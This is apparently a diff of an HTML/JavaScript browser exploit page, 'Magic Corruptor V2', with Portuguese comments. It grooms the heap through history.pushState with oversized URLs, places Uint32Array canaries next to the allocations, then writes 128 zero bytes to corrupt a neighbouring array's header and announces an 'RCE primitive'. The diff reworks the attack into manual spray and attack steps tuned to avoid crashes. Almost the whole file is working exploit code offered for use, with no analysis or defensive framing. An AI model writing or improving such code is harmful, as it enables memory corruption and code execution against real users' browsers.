@@ -1,123 +1,138 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Magic Corruptor: Incremental Attack</title>
+    <title>Magic Corruptor V2 (Manual)</title>
     <style>
-        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
-        .win { color: #ffff00; font-weight: bold; border: 1px solid yellow; padding: 5px; }
+        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
+        .btn { 
+            padding: 20px; font-size: 1.2em; cursor: pointer; 
+            background: #222; color: #fff; border: 2px solid #0f0; margin-bottom: 10px; width: 100%;
+        }
+        .btn:hover { background: #333; }
+        .win { color: #ffff00; font-weight: bold; background: #440000; padding: 5px; }
     </style>
 </head>
 <body>
 
-<h1>Magic Corruptor</h1>
-<p>Estratégia: Teste 6 (Incremental) + Vítimas Intercaladas + Payload de 128 Bytes</p>
+<h1>Magic Corruptor V2</h1>
+<p>Controle manual para evitar travamento.</p>
 
-<button onclick="runExploit()">DISPARAR EXPLOIT</button>
+<button class="btn" onclick="runPhase1()">PASSO 1: PREPARAR HEAP (Spray + Compact)</button>
+<button class="btn" onclick="runPhase2()" id="btnAttack" style="border-color: red; color: red;">PASSO 2: ATACAR (128 Bytes Zeros)</button>
+
 <div id="log">Aguardando...</div>
 
 <script>
     const BASE_OFFSET = 709522; 
-    var victims = []; // Nossos sensores
+    var victims = []; 
 
     function log(msg, type='') {
         const el = document.getElementById('log');
-        const color = type === 'win' ? '#ffff00' : '#00ff00';
+        const color = type === 'win' ? '#ffff00' : (type === 'err' ? '#ff5555' : '#00ff00');
         el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
         el.scrollTop = el.scrollHeight;
     }
 
     async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-    // Cria payload seguro (0x01 - 0x20) para o grooming
     function makeGroomPayload(size) {
         let s = "";
         for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
         return s;
     }
 
-    async function runExploit() {
-        log("INICIANDO SEQUÊNCIA MÁGICA REVISADA...", 'win');
+    // --- FASE 1: PREPARAÇÃO ---
+    async function runPhase1() {
+        log("=== INICIANDO PREPARAÇÃO ===", 'win');
         victims = [];
-
-        // FASE 1: O "TESTE 6" MODIFICADO (Incremental com Vítimas)
-        log("[1] Crescimento Incremental com Vítimas...");
         
-        // Vamos de 1000 até 50000 bytes, como no seu teste original
-        for(let size = 1000; size <= 50000; size += 2000) {
-            
-            // 1. Cria a String de Grooming (History)
-            let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
-            history.pushState({}, `groom_${size}`, payload);
-            
-            // 2. IMEDIATAMENTE coloca uma vítima atrás dela
-            // Tentamos pegar o espaço logo após a string alocada
-            let v = new Uint32Array(32); 
-            v.fill(0x13371337); // Marcador visível
-            v.magic = size; // Pra saber qual iteração criou
-            victims.push(v);
-
-            if(size % 10000 === 0) {
-                log(`    ...${size} bytes (Vítimas ativas: ${victims.length})`);
-                await wait(50); // Pequena pausa pro navegador respirar
-            }
-        }
-
-        log("[2] Compactando (Teste 3 - Padrões)...");
-        // Injeta alguns padrões para forçar alinhamento final
-        for(let i=0; i<100; i++) {
-             history.pushState({}, `pattern_${i}`, "/" + "A".repeat(BASE_OFFSET) + "\x09\x20".repeat(50));
-        }
+        // Reduzimos o teto para 40.000 para evitar o OOM no final
+        const MAX_SIZE = 40000; 
         
-        await wait(1000); // Espera o GC assentar a poeira
-
-        // FASE 3: O ATAQUE DE 128 BYTES
-        log("[3] Disparando Ataque de 128 Bytes (Zeros)...", 'win');
+        log("[1] Spray Incremental com Vítimas...");
         
-        // Você confirmou que 128 bytes passa.
-        // Isso é suficiente para zerar o Header + os primeiros 24 números do array vítima!
         try {
-            let buffer = "A".repeat(BASE_OFFSET);
-            let attack = "\x00".repeat(128); // O "Martelo" de zeros
-            
-            // Dispara várias vezes para garantir
-            for(let k=0; k<5; k++) {
-                history.pushState({}, `PWN_${k}`, "/" + buffer + attack);
+            for(let size = 1000; size <= MAX_SIZE; size += 2000) {
+                // Grooming
+                let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
+                history.pushState({}, `groom_${size}`, payload);
+                
+                // Vítima (Canário)
+                let v = new Uint32Array(32); 
+                v.fill(0x13371337); 
+                v.magic = size; 
+                victims.push(v);
+
+                // Pausa para UI atualizar a cada 5 iterações
+                if(size % 10000 === 0) {
+                    log(`    ...${size} bytes alocados.`);
+                    await wait(100); 
+                }
             }
-            
-            log("    Ataque enviado. Verificando danos...");
-            checkCorruption();
-            
         } catch(e) {
-            log(`[!] Erro no ataque: ${e.message}`);
+            log(`[!] Aviso durante spray: ${e.message}`, 'err');
         }
+
+        log("[2] Compactando (Suave)...");
+        await wait(500);
+
+        // Reduzimos de 100 para 20 iterações para não travar
+        for(let i=0; i<20; i++) {
+             history.pushState({}, `pattern_${i}`, "/" + "A".repeat(BASE_OFFSET) + "\x09\x20".repeat(50));
+             if(i % 5 === 0) await wait(50);
+        }
+        
+        log("HEAP PRONTO. Aguarde 5 segundos antes de atacar...", 'win');
     }
 
-    function checkCorruption() {
+    // --- FASE 2: ATAQUE ---
+    async function runPhase2() {
+        log("=== INICIANDO ATAQUE (ZEROS) ===", 'win');
+        
         let success = false;
         
-        for(let i=0; i<victims.length; i++) {
-            let v = victims[i];
+        // Tenta escrever 128 bytes de zeros
+        // Isso deve zerar o Header + Dados do array vizinho
+        try {
+            let buffer = "A".repeat(BASE_OFFSET);
+            let attack = "\x00".repeat(128); 
             
-            // Se o header for corrompido, o tamanho pode mudar
-            if (v.length !== 32) {
-                log(`!!! JACKPOT !!! Vítima ${i} (Iteração ${v.magic}) TAMANHO ALTERADO: ${v.length}`, 'win');
-                success = true;
-                break; // Parar no primeiro sucesso para analisar
+            // Dispara 3 vezes
+            for(let k=0; k<3; k++) {
+                history.pushState({}, `PWN_${k}`, "/" + buffer + attack);
+                await wait(100);
             }
             
-            // Se o conteúdo for zerado (0x00 em vez de 0x13371337)
-            if (v[0] !== 0x13371337) {
-                log(`!!! JACKPOT !!! Vítima ${i} (Iteração ${v.magic}) CONTEÚDO ZERADO!`, 'win');
-                log(`    Valor lido: 0x${v[0].toString(16)}`, 'win');
-                success = true;
-                break;
-            }
-        }
+            log("Ataque enviado. Verificando vítimas...");
+            
+            // VERIFICAÇÃO
+            for(let i=0; i<victims.length; i++) {
+                let v = victims[i];
+                
+                // Checa Tamanho
+                if (v.length !== 32) {
+                    log(`!!! JACKPOT !!! Vítima ${i} TAMANHO MUDOU: ${v.length}`, 'win');
+                    success = true;
+                }
+                
+                // Checa Conteúdo (Primeiro elemento deve ser 0x13371337)
+                // Se for 0, foi sobrescrito!
+                if (v[0] !== 0x13371337) {
+                    log(`!!! JACKPOT !!! Vítima ${i} CONTEÚDO ZERADO! Valor: ${v[0]}`, 'win');
+                    success = true;
+                }
 
-        if(!success) {
-            log("[-] Nenhuma corrupção visível. O alinhamento ainda falhou.");
-            log("    Sugestão: Tente mudar o incremento (step) de 2000 para 1000.");
+                if (success) {
+                    alert("RCE PRIMITIVE UNLOCKED!\nCorrupção confirmada.");
+                    break;
+                }
+            }
+            
+            if(!success) log("[-] Nenhuma corrupção detectada. Tente rodar o Ataque novamente.");
+
+        } catch(e) {
+            log(`[!] Erro no ataque: ${e.message}`, 'err');
         }
     }
 </script>
